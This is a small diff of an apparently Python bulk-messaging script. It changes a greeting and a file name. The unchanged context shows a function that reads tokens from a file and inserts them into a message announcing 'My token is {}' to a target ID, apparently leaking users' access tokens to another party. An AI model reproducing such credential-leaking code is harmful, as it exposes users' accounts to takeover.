@@ -29,7 +29,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Ravi sir! I am using your server. My token is {}"
+      msg_template = "Hell sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
       target_id = ""
@@ -67,7 +67,7 @@ def send_messages_from_file():
       with open('Kon.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('File.txt', 'r') as file:
+      with open('FLE.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
